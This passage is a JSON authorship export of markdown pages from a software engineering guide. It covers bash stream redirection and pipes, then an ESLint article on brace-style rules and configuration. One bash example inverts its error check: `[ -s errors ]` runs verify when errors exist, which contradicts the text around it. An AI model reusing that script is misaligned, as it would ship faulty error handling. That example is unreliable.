        "content": "\u003ca href\u003d\"https://asciinema.org/a/pNnG9krPxUBmQpJ00nWr8pvxM\" target\u003d\"_blank\"\u003e\u003cimg src\u003d\"https://asciinema.org/a/pNnG9krPxUBmQpJ00nWr8pvxM.svg\" alt\u003d\"check-permission\" style\u003d\"width:500px;height:320px;\"/\u003e\u003c/a\u003e"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "**Functions** in bash scripts are just like functions in normal programming languages. More information about bash scripts can be found [here](https://www.gnu.org/software/bash/manual/html_node/). "
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Combining of Scripts via Stream Redirection"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "In Linux, you can _redirect_ the output of one application to the input of another, combining the two applications together as if there is a _pipe_ between them. In fact, Linux can _pipe_ data between programs, files, and input/output devices seamlessly. You can take advantage of these abilities in your shell commands/scripts to perform complex tasks with just a few commands."
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "For example, suppose you wrote an executable `calculate` that takes in a user input, does a calculation, and gives the output. To run it, you simply type:"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "```bash"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "./calculate"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "However, you do not want to manually test this program. Instead, you want to test with a larger data set known as `DataBundle`. You verify the output with another executable `verify`, which takes in the result as input, verifies its correctness and outputs **PASS** or **FAIL**. Here\u0027s how we can do it."
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "```bash"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "./calculate \u003c DataBundle \u003e result"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "./verify \u003c result"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "Notice in this case, `calculate` uses the data in `DataBundle` as input, and output the results to the file `result`. Then, `result` is taken as input to `verify`, and the final verification result is printed on screen."
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "Furthermore, if the code of `calculate` is buggy, it throws an exception and the error message will be redirected to the error output. As a result, our result file will be empty! In order to handle this properly, we can also redirect our error output to a file `errors`, and verify that it is empty (so that no errors have occurred during execution) before we execute `verify`."
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "```bash"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "#!/bin/bash"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "./calculate \u003c DataBundle \u003e result 2\u003e errors"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "if [ -s errors ]"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "then"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "     ./verify \u003c result"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "else"
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": "     echo \"error occured during execution.\""
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "fi"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "Furthermore, you can use the `|` symbol to chain various Linux commands together such that the output of the previous commands is passed as input to the next command."
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "The following example make use of shell commands [ps](http://man7.org/linux/man-pages/man1/ps.1.html) and [grep](http://man7.org/linux/man-pages/man1/grep.1.html). ps displays information about a selection of the active processes and grep searches for the pattern in the given input. "
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "Let us say you want to check the status of process `p` running on your system. The `ps aux` command by itself lists all the processes currently running. If there are too many processes listed and you cannot find `p`, you can pass the result of `ps aux` to `grep \u0027p\u0027` to as `ps aux | grep \u0027p\u0027` to capture process `p`\u0027s status."
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": "A more detailed introduction to I/O stream redirection can be found [here](https://www.digitalocean.com/community/tutorials/an-introduction-to-linux-i-o-redirection)."
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Why Use the Shell?"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": "A common question many people ask is: Why type commands in a shell when we can do the same things using GUI applications? Here are some reasons:"
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "- **Faster**: Often, performing a task via the shell is faster than doing the same via a GUI application. This is because the shell does not get slowed down by other factors like GUI rendering. For example, when performing tasks on a remote server using a shell, the lag will be less."
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "- **Uniform**: Unlike GUI apps whose availability and usage can vary between Linux distributions, the shell is always available and the usage is almost the same across different Linux distributions. "
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": "- **More powerful**: GUIs tends to simplify things, giving the user fewer options. With a shell, you will have complete control of every option. While the shell has a steep learning curve, once you are familiar with it, you can do more things efficiently as compared to a GUI application. For example, you can automate things with a shell, something not easy to do with a GUI application."
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## How to Get Started?"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "In our opinion, there is no need to learn the shell in one go. Instead, whenever you use a GUI tool to accomplish a task, try to learn how to do the same using the shell. For example, when using git, use it via the shell instead of a GUI tool such as Source Tree. That way, you can learn the shell incrementally, over time."
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": "However, if you really wish to learn bash systematically, below are some resources you might find useful."
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": "- [Bash Reference Manual](https://www.gnu.org/software/bash/manual/html_node/) is a good reference manual of linux bash shell. "
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "- The [Google Shell Style Guide](https://google.github.io/styleguide/shell.xml) is a good baseline for good shell scripting style."
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": "- Gentoo has a good [`bash` shell reference](https://devmanual.gentoo.org/tools-reference/bash/)."
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "- Apple\u0027s [Shell Scripting Primer](https://developer.apple.com/library/archive/documentation/OpenSource/Conceptual/ShellScripting/Introduction/Introduction.html) is a in-depth introduction to shell scripting for beginners."
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": "In addition, you can always use the [`man`](https://en.wikipedia.org/wiki/Man_page) command to find more information about a bash command. For example, the command `man grep` will give you the built-in help page about the `grep` command. These help pages are written in a programmer-friendly format and are very comprehensive."
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": "Below is an example showing the man page for `grep` command."
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": "GREP(1)                   BSD General Commands Manual                  GREP(1)"
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": "NAME"
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": "     grep, egrep, fgrep, zgrep, zegrep, zfgrep -- file pattern searcher"
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": "SYNOPSIS"
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": "     grep [-abcdDEFGHhIiJLlmnOopqRSsUVvwxZ] [-A num] [-B num] [-C[num]]"
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": "          [-e pattern] [-f file] [--binary-files\u003dvalue] [--color[\u003dwhen]]"
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": "          [--colour[\u003dwhen]] [--context[\u003dnum]] [--label] [--line-buffered]"
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": "          [--null] [pattern] [file ...]"
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": "DESCRIPTION"
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": "     The grep utility searches any given input files, selecting lines that"
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": "     match one or more patterns.  By default, a pattern matches an input line"
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": "     if the regular expression (RE) in the pattern matches the input line"
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": "     without its trailing newline.  An empty expression matches every line."
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": "     Each input line that matches at least one of the patterns is written to"
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": "     the standard output ......"
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 6,
      "iskandarzulkarnaien": 9,
      "-": 177
    }
  },
  {
    "path": "contents/staticAnalysis/ESLint.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: ESLint"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# ESLint"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Author: [Nicholas Chua](https://github.com/nus-cs3281/2018/blob/master/students/nicholasChua/nicholasChua-Resume.md)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Overview](#overview)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Rules](#rules)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Setting Up](#setting-up)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Usage](#usage)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Plugins](#plugins)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Resources](#resources)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": "## Overview"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": "[ESLint](https://eslint.org/docs/about/) is an open source JavaScript linter."
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "Code linting is a type of static analysis that helps find problematic patterns or code that does not follow a certain style guideline. JavaScript, being a loosely-typed, interpreted language, is prone to developer errors and therefore linting is especially important when working with JavaScript."
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "ESLint is shipped with a wide range of [built-in rules](https://eslint.org/docs/rules/) that can be configured on installation. It also offers flexibility by allowing importing your own custom rules via [plugins](https://eslint.org/docs/developer-guide/working-with-plugins)."
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "## Rules"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "ESLint comes shipped with [built-in rules](https://eslint.org/docs/rules/) that can be [configured](#setting-up) to suit your needs."
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "An example of a rule would be [`brace-style`](https://eslint.org/docs/rules/brace-style). It enforces a specific placement of braces relative to the control statement and body. Brace style is based on preference or organization standards, and ESLint has options to enforce the brace style of your choice. They include:"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "[One true brace style (1TBS)](https://en.wikipedia.org/wiki/Indentation_style#Variant:_1TBS_(OTBS))"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "if (foo) {"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "  bar();"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "} else {"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "  baz();"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "[Stroustrup](https://en.wikipedia.org/wiki/Indentation_style#Variant:_Stroustrup)"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "if (foo) {"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "  bar();"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "else {"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "  baz();"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "[Allman](https://en.wikipedia.org/wiki/Indentation_style#Allman_style)"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "if (foo)"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "{"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "  bar();"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "else"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "{"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "  baz();"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "An additional option `allowSingleLine` can be enabled to allow opening and closing braces for a block to be on the same line:"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "if (foo) { bar(); }"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "else { baz(); }"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "If you are unsure about the options of the rule you want to change, you can refer to the comprehensive [rule documentation](https://eslint.org/docs/rules/)."
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Setting up"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "After [installing with npm](https://eslint.org/docs/user-guide/getting-started#installation-and-usage), ESLint can be configured in [two ways](https://eslint.org/docs/user-guide/configuring#configuring-rules):"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "**Single configuration file**. In this example, the rule is configured in `.eslintrc.json` and enforces all braces in the **project** to follow Allman style:"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "```json"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "{"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "  \"rules\": {"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "    \"brace-style\": [\"error\", \"allman\"]"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "**Configuration comments** inside your file. In this example, the comments enforces all braces in the **file** to follow Allman style:"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "/* eslint brace-style: [\"error\", \"allman\"] */"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "if (foo \u003d\u003d\u003d bar) { // should be on the next line"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "  return;"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "Linting output:"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "```shell"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": " 1:10  error  Opening curly brace appears on the same line as controlling statement  brace-style"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbr/\u003e"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "**NOTE**: That specifying the rule option as \"error\" will result in the exit code of 1 when the rule is violated. If you wish for ESLint to alert you but not fail the linting, you may set it to \"warn\":"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "/* eslint brace-style: [\"warn\", \"allman\"] */"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "if (foo \u003d\u003d\u003d bar) { // warning displayed but does not affect exit code"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "  return;"
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "Linting output:"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "```shell"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "1:10  warning  Opening curly brace appears on the same line as controlling statement  brace-style"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbr/\u003e"
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "If you are not sure what rules to add to your project, you can import [configurations](https://eslint.org/docs/developer-guide/shareable-configs) published by more experienced developers or organizations."
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "Here are some popular style guide\u0027s configurations:"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "* [Airbnb](https://www.npmjs.com/package/eslint-config-airbnb)"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "* [Standard](https://www.npmjs.com/package/eslint-config-standard)"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "* [Google](https://www.npmjs.com/package/eslint-config-google)"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "At the same time, ESLint allows you to disable rules for [specific files and directories](https://eslint.org/docs/user-guide/configuring#ignoring-files-and-directories) or for [specific lines](https://eslint.org/docs/user-guide/configuring#disabling-rules-with-inline-comments)."
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "## Usage"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "Once configured, you can lint your files with [terminal commands](https://eslint.org/docs/user-guide/command-line-interface) and you can add [options](https://eslint.org/docs/user-guide/command-line-interface#options) to the command based on your needs. A useful example would be the `--fix` flag which can be used to fix all fixable errors in your code."
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "$ eslint --fix file.js"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbr/\u003e"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "ESLint can be easily integrated with your build tool of choice. Here are some [plugins](https://eslint.org/docs/user-guide/integrations#build-tools) for some popular build tools. ESLint can also work with Continuous Integration tools like Travis, AppVeyor and CircleCI. Configuration is explained in this [example using Travis](https://medium.com/jason-feng/travis-ci-guide-bdc03b3dbc9d). You can also learn how to automate ESLint to [run every time you commit](https://medium.com/the-node-js-collection/why-and-how-to-use-eslint-in-your-project-742d0bc61ed7)."
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbr/\u003e"
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "ESLint also has [editor integrations](https://eslint.org/docs/user-guide/integrations#editors) such as error highlighting in many popular editors like Atom and WebStorm."
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "[ESLint Package for Atom](https://atom.io/packages/linter-eslint)"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": "![linter-eslint](https://imgur.com/6Nrj4NV.png)"
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "## Plugins"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
